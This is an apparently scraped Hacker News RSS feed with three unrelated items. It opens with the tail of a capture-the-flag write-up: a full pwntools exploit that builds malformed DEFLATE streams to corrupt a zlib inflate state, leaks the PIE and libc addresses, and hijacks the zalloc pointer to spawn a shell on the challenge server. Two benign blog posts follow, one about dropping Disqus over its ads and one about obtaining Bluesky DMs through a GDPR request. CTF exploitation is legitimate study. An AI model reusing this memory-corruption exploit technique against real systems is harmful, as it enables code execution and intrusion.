            bit = (value &amp;gt;&amp;gt; i) &amp;amp; 1
            if bit:
                self.bits |= (1 &amp;lt;&amp;lt; self.bit_count)
            self.bit_count += 1
            if self.bit_count == 8:
                self.data.append(self.bits)
                self.bits = 0
                self.bit_count = 0
    
    def bytebits(self):
        self.write_bits(0, 8 - (self.bit_count % 8))

    def get_bytes(self):
        if self.bit_count &amp;gt; 0:
            self.data.append(self.bits)
        return self.data

def generate_huffman_codes_from_lengths(lengths):
    max_len = 0
    for length in lengths:
        if length &amp;gt; max_len:
            max_len = length
    
    if max_len == 0:
        return {}

    bl_count = [0] * (max_len + 1)
    for length in lengths:
        if length &amp;gt; 0:
            bl_count[length] += 1
    
    code = 0
    next_code = [0] * (max_len + 1)
    for bits_len in range(1, max_len + 1):
        code = (code + bl_count[bits_len - 1]) &amp;lt;&amp;lt; 1
        next_code[bits_len] = code

    huffman_codes = {}
    for i, length in enumerate(lengths):
        if length != 0:
            rev_code = int(f'{next_code[length]:0{length}b}'[::-1], 2)
            huffman_codes[i] = (rev_code, length)
            next_code[length] += 1
    
    return huffman_codes

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193, 257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145, 8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
order = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]

def find_len_sym(length):
    for i in range(len(lbase)):
        if lbase[i] &amp;gt; length:
            i -= 1
            break
    base_len = lbase[i]
    extra_bits = lext[i]
    extra_val = length - base_len
    return 257 + i, extra_bits, extra_val

def find_dist_sym(distance):
    for i in range(len(dbase)):
        if dbase[i] &amp;gt; distance:
            i -= 1
            break
    base_dist = dbase[i]
    extra_bits = dext[i]
    extra_val = distance - base_dist
    return i, extra_bits, extra_val

def encode_lengths_rle(lengths):
    encoded = []
    i = 0
    while i &amp;lt; len(lengths):
        current_len = lengths[i]
        
        if current_len == 0:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == 0 and count &amp;lt; 138:
                count += 1
            if count &amp;gt;= 11:
                encoded.append((18, count - 11))
                i += count
                continue
            if count &amp;gt;= 3:
                encoded.append((17, count - 3))
                i += count
                continue

        if i &amp;gt; 0 and current_len == lengths[i - 1]:
            count = 0
            while i + count &amp;lt; len(lengths) and lengths[i + count] == current_len and count &amp;lt; 6:
                count += 1
            if count &amp;gt;= 3:
                encoded.append((16, count - 3))
                i += count
                continue

        encoded.append((current_len, None))
        i += 1
    return encoded

def create_dynamic_deflate_payload(stream, is_last, symbol_stream, ll_lengths, dist_lengths):
    
    nlen = max(i for i, length in enumerate(ll_lengths) if length &amp;gt; 0) + 1
    ndist = max(i for i, length in enumerate(dist_lengths) if length &amp;gt; 0) + 1
    
    all_lengths = ll_lengths[:nlen] + dist_lengths[:ndist]
    rle_encoded_lengths = encode_lengths_rle(all_lengths)
    
    rle_symbols = [item[0] for item in rle_encoded_lengths]
    code_symbol_freqs = {sym: rle_symbols.count(sym) for sym in set(rle_symbols)}
    
    code_table_lengths = [0] * 19
    for sym in code_symbol_freqs:
        code_table_lengths[sym] = 7
    
    ncode = max(i for i, length in enumerate(order) if code_table_lengths[length] &amp;gt; 0) + 1

    code_huffman_table = generate_huffman_codes_from_lengths(code_table_lengths)

    stream.write_bits(is_last, 1) # BFINAL
    stream.write_bits(2, 2) # BTYPE (10 for dynamic)

    stream.write_bits(nlen - 257, 5)
    stream.write_bits(ndist - 1, 5)
    stream.write_bits(ncode - 4, 4)

    for i in range(ncode):
        stream.write_bits(code_table_lengths[order[i]], 3)
        
    for sym, extra_val in rle_encoded_lengths:
        code, length = code_huffman_table[sym]
        stream.write_bits(code, length)
        if sym == 16: stream.write_bits(extra_val, 2)
        elif sym == 17: stream.write_bits(extra_val, 3)
        elif sym == 18: stream.write_bits(extra_val, 7)


    ll_huffman_table = generate_huffman_codes_from_lengths(ll_lengths)
    dist_huffman_table = generate_huffman_codes_from_lengths(dist_lengths)
    
    for type, val in symbol_stream:
        if type == 'LIT':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'EOB':
            code, length = ll_huffman_table[val]
            stream.write_bits(code, length)
        elif type == 'LD':
            l, d = val
            len_sym, len_extra_bits, len_extra_val = find_len_sym(l)
            dist_sym, dist_extra_bits, dist_extra_val = find_dist_sym(d)
            
            code, length = ll_huffman_table[len_sym]
            stream.write_bits(code, length)
            if len_extra_bits &amp;gt; 0:
                stream.write_bits(len_extra_val, len_extra_bits)
            
            code, length = dist_huffman_table[dist_sym]
            stream.write_bits(code, length)
            if dist_extra_bits &amp;gt; 0:
                stream.write_bits(dist_extra_val, dist_extra_bits)
        elif type == 'INVALID':
            code, length = val
            stream.write_bits(code, length)

def create_exploit_stream(stream):
    # STORED BLOCK ===============================================================================
    stream.write_bits(0, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = 0x200
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(ord('X'), 8)
    # STORED BLOCK ===============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = [ ('EOB', 256) ]

    ll_lengths = [0] * 286
    ll_lengths[256] = 3 # EOB

    dist_lengths = [0] * 30
    for i in range(17,30):
        dist_lengths[i] = 15

    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = []

    symbol_stream.append(("INVALID", (8,10)))
    symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
    symbol_stream.append(("INVALID", (int('000'[::-1],2),3)))
    symbol_stream.append(("INVALID", (0b1111111,7))) # extra bits
    symbol_stream.append(('EOB', 256))
    ll_lengths = [0] * 286
    ll_lengths[256] = 10 # EOB
    ll_lengths[257] = 10 # Length 3
    ll_lengths[258] = 12 # Length 4

    dist_lengths = [0] * 30
    dist_lengths[17] = 3 # Distance ???

    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

    # STORED BLOCK ===============================================================================
    stream.write_bits(0, 5) # dummy
    stream.write_bits(0, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = 0x10
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(ord('C'), 8)
    # STORED BLOCK ===============================================================================

    # DYNAMIC BLOCK ==============================================================================
    symbol_stream = []
    symbol_stream.append(('LIT', 65))
    for i in range(0,0x2ce):
        symbol_stream.append(('LD', (10, 1)))
    for i in range(0,7):
        symbol_stream.append(('LIT', 65))
    symbol_stream.append(('EOB', 256))

    ll_lengths = [0] * 286
    ll_lengths[65] = 3  # 'A'
    ll_lengths[256] = 3 # EOB
    ll_lengths[264] = 3 # Length 10

    dist_lengths = [0] * 30
    dist_lengths[0] = 3 # Distance 1


    create_dynamic_deflate_payload(stream, 0, symbol_stream, ll_lengths, dist_lengths)
    # DYNAMIC BLOCK ==============================================================================

def overwrite_infstream(stream, pay):
    # STORED BLOCK ===============================================================================
    overwrriten_infstream = pay

    stream.write_bits(1, 1) # BFINAL
    stream.write_bits(0, 2) # BTYPE (0 for stored)
    stream.bytebits()
    stored_block_length = len(overwrriten_infstream)
    stream.write_bits(stored_block_length + ( (stored_block_length ^ 0xffff) &amp;lt;&amp;lt; 16 ), 32) 
    for i in range(0, stored_block_length):
        stream.write_bits(overwrriten_infstream[i], 8)
    # STORED BLOCK =============================================================================

#p = process("./webz")
p = remote("webz.2025.ctfcompetition.com", 1337)

# POW =============================================================================
print(p.recv(1024))
answer = raw_input()
print(answer)
p.sendline(answer)
time.sleep(0.5)
# POW =============================================================================

def send_webz_payload(pay):
    NORMAL_AROUND_WIDTH_HEIGHT = p8(0x0) + p8(52) + p8(0x0) + p8(5)
    p.send(p32(len(pay)+12))
    p.send(b"WEBZ"+NORMAL_AROUND_WIDTH_HEIGHT+b"\x00\x00\x00\x00"+pay)
    time.sleep(0.5)

# Leaking Pie Base By Partial-Overwrite =============================================================================
pay = b"x"*0x30 + p8(0x0)
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())

p.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')
pie_base = u64(p.recvn(6)+b'\x00\x00') - 0x1251b
print(f'pie_base = {hex(pie_base)}')
# Leaking Pie Base By Partial-Overwrite =============================================================================

# Leaking Libc Base By AAR =============================================================================
pay = b"x"*0x30 + p64(pie_base+0x12000) # free@got
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())

p.recvuntil(b'receipt: ')
libc_base = u64(p.recvn(6)+b'\x00\x00') - 0xadd30
print(f'libc_base = {hex(libc_base)}')
# Leaking Libc Base By AAR =============================================================================

# Control Flow Hijacking By Overwriting zalloc =============================================================================
system_without_align_issue = libc_base+0x582d2
binsh = libc_base+0x1cb42f
jmp_to_zfree = pie_base+0x44da
dummy_memory = pie_base+0x13000
pay = b"\x00"*0x30 + p64(dummy_memory) + p64(dummy_memory) + p64(jmp_to_zfree) + p64(system_without_align_issue) + p64(binsh) * 30
stream = BitStream()
create_exploit_stream(stream)
overwrite_infstream(stream, pay)
send_webz_payload(stream.get_bytes())
# Control Flow Hijacking By Overwriting zalloc =============================================================================

p.interactive()&lt;/code&gt;&lt;p&gt;This is the final exploit. It successfully retrieves the flag.&lt;/p&gt;&lt;quote&gt;&lt;code&gt;CTF{MaybeReadyToTry0clickH1ntEstimateBandwidth}&lt;/code&gt;&lt;/quote&gt;&lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45422653</guid><pubDate>Tue, 30 Sep 2025 06:50:11 +0000</pubDate></item><item><title>Disqus Turned My Blog into an Ad Farm – So I Killed It</title><link>https://ryansouthgate.com/goodbye-disqus/</link><description>&lt;doc fingerprint="a2e43117070623c3"&gt;
  &lt;main&gt;
    &lt;head rend="h4"&gt;Intro&lt;/head&gt;
    &lt;p&gt;This will be a short and sweet post. As I’m not big on goodbyes.&lt;/p&gt;
    &lt;p&gt;Disqus started showing ads for their “free” tier comments system a few years back. At the time, the communication they sent out via email, seemed quite laid-back and had the tone of “don’t worry about it, it’s not a big thing”. Which in part lead me to almost forget it happened.&lt;/p&gt;
    &lt;p&gt;At the time, the disqus comments system looked quite smart and sleek. I remember thinking that the ads system will possibly look smart and sleek too. Which alleviated any worries I had at the time.&lt;/p&gt;
    &lt;p&gt;WELL&amp;amp;mldr;&amp;amp;mldr;.I’ve just seen the ads, and they look horrific!!!&lt;/p&gt;
    &lt;head rend="h4"&gt;Apologies&lt;/head&gt;
    &lt;p&gt;I have a Pihole set up, so ads are blocked on my home network. When I’m out of the house, my phone is connected to a Wireguard VPN which routes my data through my home internet, therefore - getting all the ad-blocking, Pihole goodness.&lt;/p&gt;
    &lt;p&gt;After years with Pi-hole, which now blocks over a million domains, I’ve become incredibly accustomed to a mostly ad-free web. Without realizing it, Iâd forgotten what the typical internet experience feels like.&lt;/p&gt;
    &lt;p&gt;I used to get a couple of emails from Disqus, letting me know that there’s a new comment on this blog. I haven’t had many of these emails recently, so I decided to disable my adblocker for a few minutes and check out the comments.&lt;/p&gt;
    &lt;p&gt;There were none, instead I was greeted by some horribly formatted and obviously scammy ads:&lt;/p&gt;
    &lt;p&gt;For the people who read this blog, I’m sorry.&lt;/p&gt;
    &lt;p&gt;I became “blind” to what the web is really like for most users. Iâve tried to keep this blog minimalist - a clean place to find answers. Those ads not only ruin that experience; they trample privacy too:&lt;/p&gt;
    &lt;p&gt;With this post, Iâve removed Disqus. It was making my blog worse, and frankly, they were profiting off my work and my visitor’s data. I want this blog to be a resource for devs and technologists, free not just in money, but in freedom from unwanted tracking and invasive ads.&lt;/p&gt;
    &lt;head rend="h4"&gt;Any Alternatives?&lt;/head&gt;
    &lt;p&gt;Iâm not entirely sure comments are needed here. There are other ways to reach me, for example; GitHub or Twitter/X. But having a place for discussion under each post can be valuable. If you have any recommendations for alternative commenting systems (especially those that respect privacy or are self-hosted), Iâd love to hear them! Please reach out if youâve found something that works well.&lt;/p&gt;
    &lt;p&gt;Thanks as always for reading - your trust matters to me.&lt;/p&gt;
    &lt;p&gt;Sorry again for the mess!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45423268</guid><pubDate>Tue, 30 Sep 2025 08:36:06 +0000</pubDate></item><item><title>Can You Use GDPR to Circumvent Bluesky's Adult Content Blocks?</title><link>https://shkspr.mobi/blog/2025/09/can-you-use-gdpr-to-circumvent-blueskys-adult-content-blocks/</link><description>&lt;doc fingerprint="a60e1b5e796736c8"&gt;
  &lt;main&gt;
    &lt;p&gt;In the battle between the Online Safety Act and GDPR, who will win? FIGHT!&lt;/p&gt;
    &lt;p&gt;I'll start by saying that I'm moderately positive on Online Safety. If services don't want to provide moderation then they shouldn't let their younger users be exposed to harm.&lt;/p&gt;
    &lt;p&gt;The social network BlueSky has taken a pragmatic approach to this. If you don't want to verify your age, you can still use its services - but it won't serve you porn or let people send you non-public messages.&lt;/p&gt;
    &lt;p&gt;I think that's pretty reasonable. I don't use BSky to look at naked &lt;del&gt;mole rats&lt;/del&gt; people, and I already have plenty of other messaging accounts. So I haven't verified my age.&lt;/p&gt;
    &lt;p&gt;There are two slight wrinkles with BSky's implementation. Firstly, there's no way to retrieve DMs which were sent before this restriction came into force. Oh, you can one-click export your data - but it only includes public data. So no DMs.&lt;/p&gt;
    &lt;p&gt;Secondly, you can't turn off DM from people who have previously messaged you. I asked people to message me to see if they got an error - but it looks like the messages just get silently accepted. I probably look a bit rude if I don't answer them.&lt;/p&gt;
    &lt;p&gt;Worse still, the DM notification keeps incrementing!&lt;/p&gt;
    &lt;p&gt;It is possible to turn off DMs - but only if you can access your DM settings. Which you can't if you haven't passed age assurance.&lt;/p&gt;
    &lt;p&gt;Well, what about GDPR?&lt;/p&gt;
    &lt;p&gt;BlueSky's privacy policy has this to say about DMs:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Your Direct Messages. We store and process your direct messages in order to enable you to communicate directly and privately with other users on the Bluesky App. These are unencrypted and can be accessed for Trust and Safety purposes.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;They go on to say that I may have the right to:&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Request Access to and Portability of Your Personal Information, including: (i) obtaining access to or a copy of your personal information; and (ii) receiving an electronic copy of personal information that you have provided to us, or asking us to send that information to another company in a structured, commonly used, and machine-readable format (also known as the “right of data portability”);&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;So I sent off a Subject Access Request asking specifically for the Direct Messages sent to/from my account.&lt;/p&gt;
    &lt;p&gt;I was 100% sure that the messages I had sent were my personal data and should be returned to me. I wasn't sure if messages other people had sent to me could be considered personal data. But I figured that the OSA hadn't invalidated GDPR.&lt;/p&gt;
    &lt;p&gt;Here's what happened:&lt;/p&gt;
    &lt;head rend="h2"&gt;Timeline&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;2025-07-24 - Sent request to their support desk and received an acknowledgement. &lt;list rend="ul"&gt;&lt;item&gt;Response: "I've gone ahead and shared your request with our team and will follow up with you if any additional information or verification is needed."&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;2025-07-31 - Sent a reminder to them. &lt;list rend="ul"&gt;&lt;item&gt;Response: "We've escalated your concern to our developers and are still waiting for their response and confirmation. We'll get back as soon as we get this information."&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;2025-08-25 - One month later sent an escalation to their legal team reminding them of their obligations. &lt;list rend="ul"&gt;&lt;item&gt;Response: Asked to provide my country of residence and to prove my account ownership by send an email from the address associated with my BSky account.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;2025-09-05 - Sent yet another chaser.&lt;/item&gt;
      &lt;item&gt;2025-09-13 - Over seven weeks since the initial request. Told them that I wanted to know which data protection authority they were registered with so I could make a formal complaint. &lt;list rend="ul"&gt;&lt;item&gt;Response: "Please be aware that we are currently in the process of making your data available for download. We will notify you as soon as it is ready."&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;2025-09-22 - 8 weeks since the complaint was raised. Sent another chaser asking how long until my data would be ready to download.&lt;/item&gt;
      &lt;item&gt;2025-09-25 - After 64 days they sent me a CSV with my data!&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Result&lt;/head&gt;
    &lt;p&gt;Here's an extract of the CSV. I've lightly redated the data, but you can see how JSON embedding works.&lt;/p&gt;
    &lt;code&gt; CSV convoId,sentAt,sender,contents
3kt6f7a2,2025-07-24 05:50:09.339+00,did:plc:pxy4cjqfu5aa6eadtx5,"{""text"": ""Testing testing""}"
3ku4lvbh,2024-06-04 18:17:52.414+00,did:plc:i6misxex577k4q6o7gl,"{""text"": ""Thought this might be up your alley. I've been to a few of them - pretty good crowd. thegeomob.com/post/july-3r..."", ""facets"": [{""index"": {""byteEnd"": 114, ""byteStart"": 85}, ""features"": [{""uri"": ""https://thegeomob.com/post/july-3rd-2024-geomoblon-details"", ""$type"": ""app.bsky.richtext.facet#link""}]}]}"
&lt;/code&gt;
    &lt;head rend="h2"&gt;Thoughts&lt;/head&gt;
    &lt;p&gt;I didn't have to prove my age. I just proved account ownership and then politely but insistently asked for my data. Frankly, it is baffling that such a well-funded company takes this long to answer a simple request.&lt;/p&gt;
    &lt;p&gt;Does this expose a gaping whole in the idea of online safety?&lt;/p&gt;
    &lt;p&gt;No. Not really. I suppose that a theoretical abuser could send messages to a minor and then that minor could go through a Subject Access Request process to try and access them. But that all feels a bit far-fetched and is likely to draw attention to both parties.&lt;/p&gt;
    &lt;head rend="h2"&gt;But why didn't you just…&lt;/head&gt;
    &lt;p&gt;This was definitely "playing on hard mode". There were other ways to get my DMs. Here are some alternatives which I didn't try and why I didn't try them.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Use a VPN to circumvent the geoblock. &lt;list rend="ul"&gt;&lt;item&gt;Why should I have to pay for a VPN, or trust my browsing data to a dodgy 3rd party? I shouldn't have to install and configure software just to work around a crappy design decision.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Go through age verification. &lt;list rend="ul"&gt;&lt;item&gt;I don't browse BlueSky for the "gentlemen's special interest" section. I already have lots of ways people can contact me. I'm not against a KYC process - but I simply don't need it.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Use a 3rd party client to download the data. &lt;list rend="ul"&gt;&lt;item&gt;I don't trust my data with 3rd party apps, and neither should you!&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Use the API to read DMs. &lt;list rend="ul"&gt;&lt;item&gt;I wasn't sure if the API required age verification. And, frankly, I couldn't be faffed learning a brand new API.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Escalate straight to the CEO or via a friend who works there. &lt;list rend="ul"&gt;&lt;item&gt;I like doing things the official way. Not everyone has a friend who works at BSky (thanks &amp;lt;REDACTED&amp;gt;!) and I feel it is better if legal teams get direct feedback from users; not management.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Ignore this and use a better social network. &lt;list rend="ul"&gt;&lt;item&gt;I go where my friends are. I have lots of friends on Mastodon and other services. BSky is OK, but I'm only there for my friends. But, while they are there, I didn't want an obnoxious DM notification taunting me.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Next Steps&lt;/head&gt;
    &lt;p&gt;I've emailed BlueSky to ask them to completely disable my inbox and clear my notifications. We'll see how long that takes them!&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45423363</guid><pubDate>Tue, 30 Sep 2025 08:50:11 +0000</pubDate></item></channel></rss>